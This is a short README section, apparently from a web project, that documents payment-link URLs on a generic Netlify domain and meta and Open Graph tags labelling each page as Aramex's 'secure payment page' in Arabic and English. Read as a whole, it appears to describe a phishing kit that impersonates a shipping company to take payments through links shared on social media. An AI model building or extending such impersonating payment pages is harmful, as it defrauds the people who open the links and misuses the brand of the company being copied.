## 🔗 Payment Link Structure

### URL Format
```
https://your-domain.netlify.app/pay/{service}.html?service={service}&payId={unique-id}
```

### Example Links
```
# Aramex
https://your-domain.netlify.app/pay/aramex.html?service=aramex&payId=123e4567-e89b-12d3-a456-426614174000
```

## 🎨 Meta Tag Configuration

Each service HTML file includes:

```html
<!-- Service-specific Title -->
<title>أرامكس - Aramex | صفحة دفع آمنة</title>

<!-- Service-specific Description -->
<meta name="description" content="أرامكس - شركة أرامكس الرائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة - صفحة دفع آمنة ومحمية" />

<!-- Open Graph Meta Tags -->
<meta property="og:title" content="أرامكس - Aramex | صفحة دفع آمنة" />
<meta property="og:description" content="أرامكس - شركة أرامكس الرائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة - صفحة دفع آمنة ومحمية" />
<meta property="og:image" content="/og-aramex.jpg" />

<!-- Twitter Card Meta Tags -->
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="/og-aramex.jpg" />
```
